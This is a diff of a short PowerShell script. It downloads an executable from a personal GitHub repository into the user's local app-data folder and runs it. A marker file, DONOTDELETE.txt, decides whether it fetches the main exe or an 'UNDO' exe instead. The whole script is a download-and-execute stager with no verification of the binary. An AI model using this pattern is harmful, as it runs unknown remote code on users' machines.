@@ -1,8 +1,22 @@
-$applicatie = "https://github.com/webntdev/webntdev.github.io/raw/main/Aplicatie/Aplicatie.exe"
-$path = "$env:LOCALAPPDATA\Aplicatie.exe"
+$checkPath = "$env:LOCALAPPDATA\DONOTDELETE.txt"
 
-Invoke-WebRequest -Uri $applicatie -OutFile $path
+if (Test-Path $checkPath) {
+    $undoApplicatie = "https://github.com/webntdev/webntdev.github.io/raw/main/Aplicatie/AplicatieUNDO.exe"
+    $undoPath = "$env:LOCALAPPDATA\ApplicatieUNDO.exe"
 
-Start-Sleep -Seconds 1
+    Invoke-WebRequest -Uri $undoApplicatie -OutFile $undoPath
 
-Start-Process -FilePath $path
+    Start-Sleep -Seconds 1
+
+    Start-Process -FilePath $undoPath
+}
+else {
+    $applicatie = "https://github.com/webntdev/webntdev.github.io/raw/main/Aplicatie/Aplicatie.exe"
+    $path = "$env:LOCALAPPDATA\Aplicatie.exe"
+
+    Invoke-WebRequest -Uri $applicatie -OutFile $path
+
+    Start-Sleep -Seconds 1
+
+    Start-Process -FilePath $path
+}
